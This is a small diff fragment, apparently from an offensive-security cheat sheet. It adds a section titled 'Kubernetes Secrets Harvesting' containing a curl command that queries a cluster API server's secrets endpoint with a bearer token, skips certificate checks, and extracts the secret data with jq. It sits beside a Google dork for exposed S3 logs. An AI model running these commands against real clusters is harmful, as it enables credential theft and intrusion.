@@ -483,6 +483,12 @@ S3 Log Google Dorking
 s3 site:amazonaws.com filetype:log
 ```
 
+## Kubernetes Secrets Harvesting:
+
+```
+$ curl -k -v -H “Authorization: Bearer <jwt_token>” -H “Content-Type: application/json” https://<master_ip>:6443/api/v1/namespaces/default/secrets | jq -r ‘.items[].data’
+```
+
 # Web Applications:
 
 ## Command Injection:
